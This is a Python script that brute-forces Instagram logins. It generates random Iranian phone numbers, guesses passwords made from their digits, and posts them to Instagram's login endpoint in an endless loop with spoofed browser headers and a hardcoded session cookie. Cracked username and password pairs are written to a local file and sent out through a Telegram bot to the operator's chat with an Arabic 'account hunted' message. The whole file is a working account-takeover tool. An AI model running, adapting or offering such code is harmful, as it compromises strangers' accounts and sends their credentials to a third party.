import requests
import time
import random
import os
u = '1234567890'
k = 0
a = 0
took= input('Enter Your Tok : ')
if took =='':
	exit('exit..!')
try:
	idddd =int(input('Entet Your ID Accunt : '))
	if idddd == '':
		exit('exit'+time.sleep(2))
except ValueError as error :
	print('No intager..!')
	exit(time.sleep(2))
while True :
	
	uu  = str(''.join(random.choice(u)for i in range(7)))
	ii = str(''.join(random.choice(u)for i in range(2)))
	
	user = str('989'+(f'{ii}')+(f'{uu}'))
	pasw = (uu)
	#user = input('[+] Enter username : ')
	#pasw = input('[+] Enter password : ')
	
	
	url = "https://www.instagram.com/accounts/login/ajax/"
	
	head = {
	
	    "accept": "*/*",
	    "accept-encoding": "gzip, deflate, br",
	    "accept-language": "en-US,en;q=0.9",
	    "content-length": "310",
	    "content-type": "application/x-www-form-urlencoded",
	    'cookie': 'mid=YU3yhAALAAFZYIwjygjHsh-MaysB; ig_did=5F08552A-1B26-4BA0-A2DD-3CB8C0629F40; ig_nrcb=1; datr=sWVQYchdy8F1kt5XaePtqXPg; shbid="9972\054745702379\0541664624686:01f7e82793a4a34d425aebc13f267a28c7ce79f4ed45e38df7eae7114ca816b0684acdf5"; shbts="1633088686\054745702379\0541664624686:01f7ca0088efa66b7713fa86badf8b933000e09e6202b70bbc3b0065b0d597836a9c7747"; csrftoken=IuHsG5GrWfPobUMUJ8phoxQ8rZKL0KdE; ds_user_id=2065151129',
	    'origin': 'https://www.instagram.com',
	    'referer': 'https://www.instagram.com/',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
	    'x-asbd-id': '198387',
	    'x-csrftoken': 'IuHsG5GrWfPobUMUJ8phoxQ8rZKL0KdE',
	    'x-ig-app-id': '936619743392459',
	    'x-ig-www-claim': '0',
	    'x-instagram-ajax': '7b744e55ba3e',
	    'x-requested-with': 'XMLHttpRequest', 
	}
	tim = str(time.time()).split('.')[1]
	
	date = {
	
	    'username': user,
	    'enc_password':  f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pasw}',
	}
	
	req = requests.post(url, headers=head , data=date).text
	#print(user,pasw)
	if ('"user":false,') and ('"authenticated":false') in req:
		a+=1
		os.system('cls' if os.name=='nt' else'clear')
		print(f'[-] - Bad >> {a}\n[-] - Done >> {k}\n[-] - {user} >> {pasw}\n')
	elif ('"user":true,') and ('"authenticated":true') in req:
		k+=1
		os.system('cls' if os.name=='nt' else'clear')
		print(f'[-] - Bad >> {a}\n[-] - Done >> {k}\n[-] - {user} >> {pasw}\n')
		with open('Logoniran.txt','a') as fi:
			fi.write(f'{user}:{pasw}\n')
		tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=تم صيد الحساب بنجاح✅\nUseename : {user}\nPassowrd : {pasw}\n')
		ru= requests.post(tlg)
		
	
	
	
